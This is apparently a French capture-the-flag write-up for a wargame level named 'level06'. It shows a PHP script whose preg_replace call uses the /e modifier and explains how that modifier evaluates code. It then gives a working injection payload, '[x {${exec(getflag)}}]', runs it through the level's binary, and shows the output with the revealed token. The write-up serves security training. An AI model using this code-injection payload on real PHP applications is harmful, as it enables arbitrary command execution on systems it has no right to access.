On trouve dans le dossier **home** un binaire nommé **level06** et un fichier php nommé **level06.php** contenant le code suivant :
```php
#!/usr/bin/php
<?php
function y($m) {
	$m = preg_replace("/\./", " x ", $m);
	$m = preg_replace("/@/", " y", $m);
	return $m;
}
function x($y, $z) {
	$a = file_get_contents($y);
	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
	$a = preg_replace("/\[/", "(", $a);
	$a = preg_replace("/\]/", ")", $a);
	return $a;
}
$r = x($argv[1], $argv[2]);
print $r;
?>
```
> La partie interessante dans le code est <code>/(\[x (.*)\])/e</code> car le **preg_replace** utilise le *modifier* **/e** ou **(PREG_REPLACE_EVAL)**, qui est connu pour être sensible aux injections (Il n'existe meme plus en PHP 7.0.0)

On comprend que le format pour la string recupérée du <code>file_get_contents</code> doit être formatée de la manière suivante:

<code>/(\[x (.*)\])/e => [x {${INJECTION}}]</code>

L'injection permet de remplacer le <code>(.*)</code> par une commande, comme par exemple **getflag**:

<pre><code>> echo '[x {${exec(getflag)}}]' > /tmp/inject
> ./level06 /tmp/inject
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
</code></pre>

